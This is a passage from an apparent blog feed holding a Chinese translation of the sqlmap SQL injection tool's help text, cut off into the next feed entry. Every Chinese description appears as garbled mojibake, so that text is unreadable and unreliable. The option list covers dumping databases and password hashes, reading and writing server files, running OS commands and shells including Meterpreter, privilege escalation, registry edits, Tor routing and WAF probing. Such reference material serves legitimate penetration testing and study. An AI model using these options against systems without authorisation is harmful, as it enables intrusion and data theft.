å¿½ç•¥è¿æ¥è¶…æ—¶</span><br><span class="line">--proxy=PROXY       ä½¿ç”¨ä»£ç†è¿æ¥ç›®æ ‡ URL</span><br><span class="line">--proxy-cred=PRO..  ä½¿ç”¨ä»£ç†è¿›è¡Œè®¤è¯ï¼ˆusername:passwordï¼‰</span><br><span class="line">--proxy-file=PRO..  ä»æ–‡ä»¶ä¸­åŠ è½½ä»£ç†åˆ—è¡¨</span><br><span class="line">--tor               ä½¿ç”¨ Tor åŒ¿åç½‘ç»œ</span><br><span class="line">--tor-port=TORPORT  è®¾ç½® Tor ä»£ç†ç«¯å£ä»£æ›¿é»˜è®¤ç«¯å£</span><br><span class="line">--tor-type=TORTYPE  è®¾ç½® Tor ä»£ç†æ–¹å¼ï¼ˆHTTPï¼ŒSOCKS4 æˆ– SOCKS5ï¼ˆé»˜è®¤ï¼‰ï¼‰</span><br><span class="line">--check-tor         æ£€æŸ¥æ˜¯å¦æ­£ç¡®ä½¿ç”¨äº† Tor</span><br><span class="line">--delay=DELAY       è®¾ç½®æ¯ä¸ª HTTP è¯·æ±‚çš„å»¶è¿Ÿç§’æ•°</span><br><span class="line">--timeout=TIMEOUT   è®¾ç½®è¿æ¥å“åº”çš„æœ‰æ•ˆç§’æ•°ï¼ˆé»˜è®¤ä¸º 30ï¼‰</span><br><span class="line">--retries=RETRIES   è¿æ¥è¶…æ—¶æ—¶é‡è¯•æ¬¡æ•°ï¼ˆé»˜è®¤ä¸º 3ï¼‰</span><br><span class="line">--randomize=RPARAM  éšæœºæ›´æ”¹ç»™å®šçš„å‚æ•°å€¼</span><br><span class="line">--safe-url=SAFEURL  æµ‹è¯•è¿‡ç¨‹ä¸­å¯é¢‘ç¹è®¿é—®ä¸”åˆæ³•çš„ URL åœ°å€ï¼ˆè¯‘è€…æ³¨ï¼š</span><br><span class="line">                    æœ‰äº›ç½‘ç«™åœ¨ä½ è¿ç»­å¤šæ¬¡è®¿é—®é”™è¯¯åœ°å€æ—¶ä¼šå…³é—­ä¼šè¯è¿æ¥ï¼Œ</span><br><span class="line">                    åé¢çš„â€œè¯·æ±‚â€å°èŠ‚æœ‰è¯¦ç»†è¯´æ˜ï¼‰</span><br><span class="line">--safe-post=SAFE..  ä½¿ç”¨ POST æ–¹æ³•å‘é€åˆæ³•çš„æ•°æ®</span><br><span class="line">--safe-req=SAFER..  ä»æ–‡ä»¶ä¸­åŠ è½½åˆæ³•çš„ HTTP è¯·æ±‚</span><br><span class="line">--safe-freq=SAFE..  æ¯è®¿é—®ä¸¤æ¬¡ç»™å®šçš„åˆæ³• URL æ‰å‘é€ä¸€æ¬¡æµ‹è¯•è¯·æ±‚</span><br><span class="line">--skip-urlencode    ä¸å¯¹ payload æ•°æ®è¿›è¡Œ URL ç¼–ç </span><br><span class="line">--csrf-token=CSR..  è®¾ç½®ç½‘ç«™ç”¨æ¥å CSRF æ”»å‡»çš„ token</span><br><span class="line">--csrf-url=CSRFURL  æŒ‡å®šå¯æå–é˜² CSRF æ”»å‡» token çš„ URL</span><br><span class="line">--force-ssl         å¼ºåˆ¶ä½¿ç”¨ SSL/HTTPS</span><br><span class="line">--hpp               ä½¿ç”¨ HTTP å‚æ•°æ±¡æŸ“æ”»å‡»</span><br><span class="line">--eval=EVALCODE     åœ¨å‘èµ·è¯·æ±‚å‰æ‰§è¡Œç»™å®šçš„ Python ä»£ç ï¼ˆä¾‹å¦‚ï¼š</span><br><span class="line">                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;ï¼‰</span><br></pre></td></tr></table></figure></div><p>ä¼˜åŒ–<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºä¼˜åŒ– sqlmap æ€§èƒ½</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-o                  å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³</span><br><span class="line">--predict-output    é¢„æµ‹å¸¸ç”¨è¯·æ±‚çš„è¾“å‡º</span><br><span class="line">--keep-alive        ä½¿ç”¨æŒä¹…çš„ HTTP(S) è¿æ¥</span><br><span class="line">--null-connection   ä»…è·å–é¡µé¢å¤§å°è€Œéå®é™…çš„ HTTP å“åº”</span><br><span class="line">--threads=THREADS   è®¾ç½® HTTP(S) è¯·æ±‚å¹¶å‘æ•°æœ€å¤§å€¼ï¼ˆé»˜è®¤ä¸º 1ï¼‰</span><br></pre></td></tr></table></figure></div><p>æ³¨å…¥<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºæŒ‡å®šè¦æµ‹è¯•çš„å‚æ•°ï¼Œ<br>â€‹ æä¾›è‡ªå®šä¹‰æ³¨å…¥ payloads å’Œç¯¡æ”¹å‚æ•°çš„è„šæœ¬</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER    æŒ‡å®šéœ€è¦æµ‹è¯•çš„å‚æ•°</span><br><span class="line">--skip=SKIP         æŒ‡å®šè¦è·³è¿‡çš„å‚æ•°</span><br><span class="line">--skip-static       æŒ‡å®šè·³è¿‡éåŠ¨æ€å‚æ•°</span><br><span class="line">--param-exclude=..  ç”¨æ­£åˆ™è¡¨è¾¾å¼æ’é™¤å‚æ•°ï¼ˆä¾‹å¦‚ï¼š&quot;ses&quot;ï¼‰</span><br><span class="line">--dbms=DBMS         æŒ‡å®šåç«¯ DBMSï¼ˆDatabase Management Systemï¼Œ</span><br><span class="line">                    æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼‰ç±»å‹ï¼ˆä¾‹å¦‚ï¼šMySQLï¼‰</span><br><span class="line">--dbms-cred=DBMS..  DBMS è®¤è¯å‡­æ®ï¼ˆusername:passwordï¼‰</span><br><span class="line">--os=OS             æŒ‡å®šåç«¯ DBMS çš„æ“ä½œç³»ç»Ÿç±»å‹</span><br><span class="line">--invalid-bignum    å°†æ— æ•ˆå€¼è®¾ç½®ä¸ºå¤§æ•°</span><br><span class="line">--invalid-logical   å¯¹æ— æ•ˆå€¼ä½¿ç”¨é€»è¾‘è¿ç®—</span><br><span class="line">--invalid-string    å¯¹æ— æ•ˆå€¼ä½¿ç”¨éšæœºå­—ç¬¦ä¸²</span><br><span class="line">--no-cast           å…³é—­ payload æ„é€ æœºåˆ¶</span><br><span class="line">--no-escape         å…³é—­å­—ç¬¦ä¸²è½¬ä¹‰æœºåˆ¶</span><br><span class="line">--prefix=PREFIX     æ³¨å…¥ payload çš„å‰ç¼€å­—ç¬¦ä¸²</span><br><span class="line">--suffix=SUFFIX     æ³¨å…¥ payload çš„åç¼€å­—ç¬¦ä¸²</span><br><span class="line">--tamper=TAMPER     ç”¨ç»™å®šè„šæœ¬ä¿®æ”¹æ³¨å…¥æ•°æ®</span><br></pre></td></tr></table></figure></div><p>æ£€æµ‹<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºè‡ªå®šä¹‰æ£€æµ‹æ–¹å¼</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--level=LEVEL       è®¾ç½®æµ‹è¯•ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º 1ï¼‰</span><br><span class="line">--risk=RISK         è®¾ç½®æµ‹è¯•é£é™©ç­‰çº§ï¼ˆ1-3ï¼Œé»˜è®¤ä¸º 1ï¼‰</span><br><span class="line">--string=STRING     ç”¨äºç¡®å®šæŸ¥è¯¢ç»“æœä¸ºçœŸæ—¶çš„å­—ç¬¦ä¸²</span><br><span class="line">--not-string=NOT..  ç”¨äºç¡®å®šæŸ¥è¯¢ç»“æœä¸ºå‡æ—¶çš„å­—ç¬¦ä¸²</span><br><span class="line">--regexp=REGEXP     ç”¨äºç¡®å®šæŸ¥è¯¢ç»“æœä¸ºçœŸæ—¶çš„æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">--code=CODE         ç”¨äºç¡®å®šæŸ¥è¯¢ç»“æœä¸ºçœŸæ—¶çš„ HTTP çŠ¶æ€ç </span><br><span class="line">--text-only         åªæ ¹æ®é¡µé¢æ–‡æœ¬å†…å®¹å¯¹æ¯”é¡µé¢</span><br><span class="line">--titles            åªæ ¹æ®é¡µé¢æ ‡é¢˜å¯¹æ¯”é¡µé¢</span><br></pre></td></tr></table></figure></div><p>æŠ€æœ¯<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºè°ƒæ•´ç‰¹å®š SQL æ³¨å…¥æŠ€æœ¯çš„æµ‹è¯•æ–¹æ³•</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--technique=TECH    ä½¿ç”¨çš„ SQL æ³¨å…¥æŠ€æœ¯ï¼ˆé»˜è®¤ä¸ºâ€œBEUSTQâ€ï¼Œè¯‘è€…æ³¨ï¼š</span><br><span class="line">                    B: Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹ç›²æ³¨ï¼‰</span><br><span class="line">                    E: Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰</span><br><span class="line">                    U: UNION query SQL injectionï¼ˆè”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰</span><br><span class="line">                    S: Stacked queries SQL injectionï¼ˆå †å æŸ¥è¯¢æ³¨å…¥ï¼‰</span><br><span class="line">                    T: Time-based blind SQL injectionï¼ˆæ—¶é—´å‹ç›²æ³¨ï¼‰</span><br><span class="line">                    Q: inline Query injectionï¼ˆå†…è”æŸ¥è¯¢æ³¨å…¥ï¼‰</span><br><span class="line">--time-sec=TIMESEC  å»¶è¿Ÿ DBMS çš„å“åº”ç§’æ•°ï¼ˆé»˜è®¤ä¸º 5ï¼‰</span><br><span class="line">--union-cols=UCOLS  è®¾ç½®è”åˆæŸ¥è¯¢æ³¨å…¥æµ‹è¯•çš„åˆ—æ•°ç›®èŒƒå›´</span><br><span class="line">--union-char=UCHAR  ç”¨äºæš´åŠ›çŒœè§£åˆ—æ•°çš„å­—ç¬¦</span><br><span class="line">--union-from=UFROM  è®¾ç½®è”åˆæŸ¥è¯¢æ³¨å…¥ FROM å¤„ç”¨åˆ°çš„è¡¨</span><br><span class="line">--dns-domain=DNS..  è®¾ç½®ç”¨äº DNS æ¸—å‡ºæ”»å‡»çš„åŸŸåï¼ˆè¯‘è€…æ³¨ï¼š</span><br><span class="line">                    æ¨èé˜…è¯»ã€Šåœ¨SQLæ³¨å…¥ä¸­ä½¿ç”¨DNSè·å–æ•°æ®ã€‹</span><br><span class="line">                    http://cb.drops.wiki/drops/tips-5283.htmlï¼Œ</span><br><span class="line">                    åœ¨åé¢çš„â€œæŠ€æœ¯â€å°èŠ‚ä¸­ä¹Ÿæœ‰ç›¸åº”è§£é‡Šï¼‰</span><br><span class="line">--second-url=SEC..  è®¾ç½®äºŒé˜¶å“åº”çš„ç»“æœæ˜¾ç¤ºé¡µé¢çš„ URLï¼ˆè¯‘è€…æ³¨ï¼š</span><br><span class="line">                    è¯¥é€‰é¡¹ç”¨äº SQL äºŒé˜¶æ³¨å…¥ï¼‰</span><br><span class="line">--second-req=SEC..  ä»æ–‡ä»¶è¯»å– HTTP äºŒé˜¶è¯·æ±‚</span><br></pre></td></tr></table></figure></div><p>æŒ‡çº¹è¯†åˆ«</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f, --fingerprint   æ‰§è¡Œå¹¿æ³›çš„ DBMS ç‰ˆæœ¬æŒ‡çº¹è¯†åˆ«</span><br></pre></td></tr></table></figure></div><p>æšä¸¾<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºè·å–åç«¯ DBMS çš„ä¿¡æ¯ï¼Œç»“æ„å’Œæ•°æ®è¡¨ä¸­çš„æ•°æ®ã€‚<br>â€‹ æ­¤å¤–ï¼Œè¿˜å¯ä»¥è¿è¡Œä½ è¾“å…¥çš„ SQL è¯­å¥</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a, --all           è·å–æ‰€æœ‰ä¿¡æ¯ã€æ•°æ®</span><br><span class="line">-b, --banner        è·å– DBMS banner</span><br><span class="line">--current-user      è·å– DBMS å½“å‰ç”¨æˆ·</span><br><span class="line">--current-db        è·å– DBMS å½“å‰æ•°æ®åº“</span><br><span class="line">--hostname          è·å– DBMS æœåŠ¡å™¨çš„ä¸»æœºå</span><br><span class="line">--is-dba            æ¢æµ‹ DBMS å½“å‰ç”¨æˆ·æ˜¯å¦ä¸º DBAï¼ˆæ•°æ®åº“ç®¡ç†å‘˜ï¼‰</span><br><span class="line">--users             æšä¸¾å‡º DBMS æ‰€æœ‰ç”¨æˆ·</span><br><span class="line">--passwords         æšä¸¾å‡º DBMS æ‰€æœ‰ç”¨æˆ·çš„å¯†ç å“ˆå¸Œ</span><br><span class="line">--privileges        æšä¸¾å‡º DBMS æ‰€æœ‰ç”¨æˆ·ç‰¹æƒçº§</span><br><span class="line">--roles             æšä¸¾å‡º DBMS æ‰€æœ‰ç”¨æˆ·è§’è‰²</span><br><span class="line">--dbs               æšä¸¾å‡º DBMS æ‰€æœ‰æ•°æ®åº“</span><br><span class="line">--tables            æšä¸¾å‡º DBMS æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨</span><br><span class="line">--columns           æšä¸¾å‡º DBMS è¡¨ä¸­çš„æ‰€æœ‰åˆ—</span><br><span class="line">--schema            æšä¸¾å‡º DBMS æ‰€æœ‰æ¨¡å¼</span><br><span class="line">--count             è·å–æ•°æ®è¡¨æ•°ç›®</span><br><span class="line">--dump              å¯¼å‡º DBMS æ•°æ®åº“è¡¨é¡¹</span><br><span class="line">--dump-all          å¯¼å‡ºæ‰€æœ‰ DBMS æ•°æ®åº“è¡¨é¡¹</span><br><span class="line">--search            æœç´¢åˆ—ï¼Œè¡¨å’Œ/æˆ–æ•°æ®åº“å</span><br><span class="line">--comments          æšä¸¾æ•°æ®æ—¶æ£€æŸ¥ DBMS æ³¨é‡Š</span><br><span class="line">-D DB               æŒ‡å®šè¦æšä¸¾çš„ DBMS æ•°æ®åº“</span><br><span class="line">-T TBL              æŒ‡å®šè¦æšä¸¾çš„ DBMS æ•°æ®è¡¨</span><br><span class="line">-C COL              æŒ‡å®šè¦æšä¸¾çš„ DBMS æ•°æ®åˆ—</span><br><span class="line">-X EXCLUDE          æŒ‡å®šä¸æšä¸¾çš„ DBMS æ ‡è¯†ç¬¦</span><br><span class="line">-U USER             æŒ‡å®šæšä¸¾çš„ DBMS ç”¨æˆ·</span><br><span class="line">--exclude-sysdbs    æšä¸¾æ‰€æœ‰æ•°æ®è¡¨æ—¶ï¼ŒæŒ‡å®šæ’é™¤ç‰¹å®šç³»ç»Ÿæ•°æ®åº“</span><br><span class="line">--pivot-column=P..  æŒ‡å®šä¸»åˆ—</span><br><span class="line">--where=DUMPWHERE   åœ¨è½¬å‚¨è¡¨æ—¶ä½¿ç”¨ WHERE æ¡ä»¶è¯­å¥</span><br><span class="line">--start=LIMITSTART  æŒ‡å®šè¦å¯¼å‡ºçš„æ•°æ®è¡¨æ¡ç›®å¼€å§‹è¡Œæ•°</span><br><span class="line">--stop=LIMITSTOP    æŒ‡å®šè¦å¯¼å‡ºçš„æ•°æ®è¡¨æ¡ç›®ç»“æŸè¡Œæ•°</span><br><span class="line">--first=FIRSTCHAR   æŒ‡å®šè·å–è¿”å›æŸ¥è¯¢ç»“æœçš„å¼€å§‹å­—ç¬¦ä½</span><br><span class="line">--last=LASTCHAR     æŒ‡å®šè·å–è¿”å›æŸ¥è¯¢ç»“æœçš„ç»“æŸå­—ç¬¦ä½</span><br><span class="line">--sql-query=QUERY   æŒ‡å®šè¦æ‰§è¡Œçš„ SQL è¯­å¥</span><br><span class="line">--sql-shell         è°ƒå‡ºäº¤äº’å¼ SQL shell</span><br><span class="line">--sql-file=SQLFILE  æ‰§è¡Œæ–‡ä»¶ä¸­çš„ SQL è¯­å¥</span><br></pre></td></tr></table></figure></div><p>æš´åŠ›ç ´è§£<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºæš´åŠ›ç ´è§£æµ‹è¯•</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--common-tables     æ£€æµ‹å¸¸è§çš„è¡¨åæ˜¯å¦å­˜åœ¨</span><br><span class="line">--common-columns    æ£€æµ‹å¸¸ç”¨çš„åˆ—åæ˜¯å¦å­˜åœ¨</span><br></pre></td></tr></table></figure></div><p>ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºåˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--udf-inject        æ³¨å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</span><br><span class="line">--shared-lib=SHLIB  å…±äº«åº“çš„æœ¬åœ°è·¯å¾„</span><br></pre></td></tr></table></figure></div><p>è®¿é—®æ–‡ä»¶ç³»ç»Ÿ<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºè®¿é—®åç«¯ DBMS çš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--file-read=FILE..  è¯»å–åç«¯ DBMS æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶</span><br><span class="line">--file-write=FIL..  å†™å…¥åˆ°åç«¯ DBMS æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶</span><br><span class="line">--file-dest=FILE..  ä½¿ç”¨ç»å¯¹è·¯å¾„å†™å…¥åˆ°åç«¯ DBMS ä¸­çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure></div><p>è®¿é—®æ“ä½œç³»ç»Ÿ<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºè®¿é—®åç«¯ DBMS çš„åº•å±‚æ“ä½œç³»ç»Ÿ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--os-cmd=OSCMD      æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</span><br><span class="line">--os-shell          è°ƒå‡ºäº¤äº’å¼æ“ä½œç³»ç»Ÿ shell</span><br><span class="line">--os-pwn            è°ƒå‡º OOB shellï¼ŒMeterpreter æˆ– VNC</span><br><span class="line">--os-smbrelay       ä¸€é”®è°ƒå‡º OOB shellï¼ŒMeterpreter æˆ– VNC</span><br><span class="line">--os-bof            åˆ©ç”¨å­˜å‚¨è¿‡ç¨‹çš„ç¼“å†²åŒºæº¢å‡º</span><br><span class="line">--priv-esc          æ•°æ®åº“è¿›ç¨‹ç”¨æˆ·ææƒ</span><br><span class="line">--msf-path=MSFPATH  Metasploit æ¡†æ¶çš„æœ¬åœ°å®‰è£…è·¯å¾„</span><br><span class="line">--tmp-path=TMPPATH  è¿œç¨‹ä¸´æ—¶æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure></div><p>è®¿é—® Windows æ³¨å†Œè¡¨ï¼š<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºè®¿é—®åç«¯ DBMS çš„ Windows æ³¨å†Œè¡¨</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--reg-read          è¯»å–ä¸€ä¸ª Windows æ³¨å†Œè¡¨é”®å€¼</span><br><span class="line">--reg-add           å†™å…¥ä¸€ä¸ª Windows æ³¨å†Œè¡¨é”®å€¼æ•°æ®</span><br><span class="line">--reg-del           åˆ é™¤ä¸€ä¸ª Windows æ³¨å†Œè¡¨é”®å€¼</span><br><span class="line">--reg-key=REGKEY    æŒ‡å®š Windows æ³¨å†Œè¡¨é”®</span><br><span class="line">--reg-value=REGVAL  æŒ‡å®š Windows æ³¨å†Œè¡¨é”®å€¼</span><br><span class="line">--reg-data=REGDATA  æŒ‡å®š Windows æ³¨å†Œè¡¨é”®å€¼æ•°æ®</span><br><span class="line">--reg-type=REGTYPE  æŒ‡å®š Windows æ³¨å†Œè¡¨é”®å€¼ç±»å‹</span><br></pre></td></tr></table></figure></div><p>é€šç”¨é€‰é¡¹ï¼š<br>â€‹ ä»¥ä¸‹é€‰é¡¹ç”¨äºè®¾ç½®é€šç”¨çš„å‚æ•°</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s SESSIONFILE      ä»æ–‡ä»¶ï¼ˆ.sqliteï¼‰ä¸­è¯»å…¥ä¼šè¯ä¿¡æ¯</span><br><span class="line">-t TRAFFICFILE      ä¿å­˜æ‰€æœ‰ HTTP æµé‡è®°å½•åˆ°æŒ‡å®šæ–‡æœ¬æ–‡ä»¶</span><br><span class="line">--batch             ä»ä¸è¯¢é—®ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨é»˜è®¤é…ç½®</span><br><span class="line">--binary-fields=..  å…·æœ‰äºŒè¿›åˆ¶å€¼çš„ç»“æœå­—æ®µï¼ˆä¾‹å¦‚ï¼š&quot;digest&quot;ï¼‰</span><br><span class="line">--check-internet    åœ¨è®¿é—®ç›®æ ‡ä¹‹å‰æ£€æŸ¥æ˜¯å¦æ­£å¸¸è¿æ¥äº’è”ç½‘</span><br><span class="line">--crawl=CRAWLDEPTH  ä»ç›®æ ‡ URL å¼€å§‹çˆ¬å–ç½‘ç«™</span><br><span class="line">--crawl-exclude=..  ç”¨æ­£åˆ™è¡¨è¾¾å¼ç­›é€‰çˆ¬å–çš„é¡µé¢ï¼ˆä¾‹å¦‚ï¼š&quot;logout&quot;ï¼‰</span><br><span class="line">--csv-del=CSVDEL    æŒ‡å®šè¾“å‡ºåˆ° CVS æ–‡ä»¶æ—¶ä½¿ç”¨çš„åˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºâ€œ,â€ï¼‰</span><br><span class="line">--charset=CHARSET   æŒ‡å®š SQL ç›²æ³¨å­—ç¬¦é›†ï¼ˆä¾‹å¦‚ï¼š&quot;0123456789abcdef&quot;ï¼‰</span><br><span class="line">--dump-format=DU..  å¯¼å‡ºæ•°æ®çš„æ ¼å¼ï¼ˆCSVï¼ˆé»˜è®¤ï¼‰ï¼ŒHTML æˆ– SQLITEï¼‰</span><br><span class="line">--encoding=ENCOD..  æŒ‡å®šè·å–æ•°æ®æ—¶ä½¿ç”¨çš„å­—ç¬¦ç¼–ç ï¼ˆä¾‹å¦‚ï¼šGBKï¼‰</span><br><span class="line">--eta               æ˜¾ç¤ºæ¯ä¸ªç»“æœè¾“å‡ºçš„é¢„è®¡åˆ°è¾¾æ—¶é—´</span><br><span class="line">--flush-session     æ¸…ç©ºå½“å‰ç›®æ ‡çš„ä¼šè¯æ–‡ä»¶</span><br><span class="line">--forms             è§£æå¹¶æµ‹è¯•ç›®æ ‡ URL çš„è¡¨å•</span><br><span class="line">--fresh-queries     å¿½ç•¥å­˜å‚¨åœ¨ä¼šè¯æ–‡ä»¶ä¸­çš„æŸ¥è¯¢ç»“æœ</span><br><span class="line">--har=HARFILE       å°†æ‰€æœ‰ HTTP æµé‡è®°å½•åˆ°ä¸€ä¸ª HAR æ–‡ä»¶ä¸­</span><br><span class="line">--hex               è·å–æ•°æ®æ—¶ä½¿ç”¨ hex è½¬æ¢</span><br><span class="line">--output-dir=OUT..  è‡ªå®šä¹‰è¾“å‡ºç›®å½•è·¯å¾„</span><br><span class="line">--parse-errors      ä»å“åº”ä¸­è§£æå¹¶æ˜¾ç¤º DBMS é”™è¯¯ä¿¡æ¯</span><br><span class="line">--preprocess=PRE..  ä½¿ç”¨ç»™å®šè„šæœ¬é¢„å¤„ç†å“åº”æ•°æ®</span><br><span class="line">--repair            é‡æ–°å¯¼å‡ºå…·æœ‰æœªçŸ¥å­—ç¬¦çš„æ•°æ®ï¼ˆ?ï¼‰</span><br><span class="line">--save=SAVECONFIG   å°†é€‰é¡¹è®¾ç½®ä¿å­˜åˆ°ä¸€ä¸ª INI é…ç½®æ–‡ä»¶</span><br><span class="line">--scope=SCOPE       ç”¨æ­£åˆ™è¡¨è¾¾å¼ä»æä¾›çš„ä»£ç†æ—¥å¿—ä¸­è¿‡æ»¤ç›®æ ‡</span><br><span class="line">--test-filter=TE..  æ ¹æ® payloads å’Œ/æˆ–æ ‡é¢˜ï¼ˆä¾‹å¦‚ï¼šROWï¼‰é€‰æ‹©æµ‹è¯•</span><br><span class="line">--test-skip=TEST..  æ ¹æ® payloads å’Œ/æˆ–æ ‡é¢˜ï¼ˆä¾‹å¦‚ï¼šBENCHMARKï¼‰è·³è¿‡éƒ¨åˆ†æµ‹è¯•</span><br><span class="line">--update            æ›´æ–° sqlmap</span><br></pre></td></tr></table></figure></div><p>æ‚é¡¹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z MNEMONICS        ä½¿ç”¨çŸ­åŠ©è®°ç¬¦ï¼ˆä¾‹å¦‚ï¼šâ€œflu,bat,ban,tec=EUâ€ï¼‰</span><br><span class="line">--alert=ALERT       åœ¨æ‰¾åˆ° SQL æ³¨å…¥æ—¶è¿è¡Œ OS å‘½ä»¤</span><br><span class="line">--answers=ANSWERS   è®¾ç½®é¢„å®šä¹‰å›ç­”ï¼ˆä¾‹å¦‚ï¼šâ€œquit=N,follow=Nâ€ï¼‰</span><br><span class="line">--beep              å‡ºç°é—®é¢˜æé†’æˆ–åœ¨å‘ç° SQL æ³¨å…¥æ—¶å‘å‡ºæç¤ºéŸ³</span><br><span class="line">--cleanup           æŒ‡å®šç§»é™¤ DBMS ä¸­çš„ç‰¹å®šçš„ UDF æˆ–è€…æ•°æ®è¡¨</span><br><span class="line">--dependencies      æ£€æŸ¥ sqlmap ç¼ºå°‘ï¼ˆå¯é€‰ï¼‰çš„ä¾èµ–</span><br><span class="line">--disable-coloring  å…³é—­å½©è‰²æ§åˆ¶å°è¾“å‡º</span><br><span class="line">--gpage=GOOGLEPAGE  æŒ‡å®šé¡µç ä½¿ç”¨ Google dork ç»“æœ</span><br><span class="line">--identify-waf      é’ˆå¯¹ WAF/IPS é˜²æŠ¤è¿›è¡Œå½»åº•çš„æµ‹è¯•</span><br><span class="line">--mobile            ä½¿ç”¨ HTTP User-Agent æ¨¡ä»¿æ™ºèƒ½æ‰‹æœº</span><br><span class="line">--offline           åœ¨ç¦»çº¿æ¨¡å¼ä¸‹å·¥ä½œï¼ˆä»…ä½¿ç”¨ä¼šè¯æ•°æ®ï¼‰</span><br><span class="line">--purge             å®‰å…¨åˆ é™¤ sqlmap data ç›®å½•æ‰€æœ‰å†…å®¹</span><br><span class="line">--skip-waf          è·³è¿‡å¯å‘å¼æ£€æµ‹ WAF/IPS é˜²æŠ¤</span><br><span class="line">--smart             åªæœ‰åœ¨ä½¿ç”¨å¯å‘å¼æ£€æµ‹æ—¶æ‰è¿›è¡Œå½»åº•çš„æµ‹è¯•</span><br><span class="line">--sqlmap-shell      è°ƒå‡ºäº¤äº’å¼ sqlmap shell</span><br><span class="line">--tmp-dir=TMPDIR    æŒ‡å®šç”¨äºå­˜å‚¨ä¸´æ—¶æ–‡ä»¶çš„æœ¬åœ°ç›®å½•</span><br><span class="line">--web-root=WEBROOT  æŒ‡å®š Web æœåŠ¡å™¨æ ¹ç›®å½•ï¼ˆä¾‹å¦‚ï¼š&quot;/var/www&quot;ï¼‰</span><br><span class="line">--wizard            é€‚åˆåˆçº§ç”¨æˆ·çš„å‘å¯¼ç•Œé¢</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sqlæ³¨å…¥å­¦ä¹ " scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>linuxå‘½ä»¤</title>
    <link href="http://example.com/2025/02/16/linux/linux%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2025/02/16/linux/linux%E5%91%BD%E4%BB%A4/</id>
    <published>2025-02-16T22:49:37.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
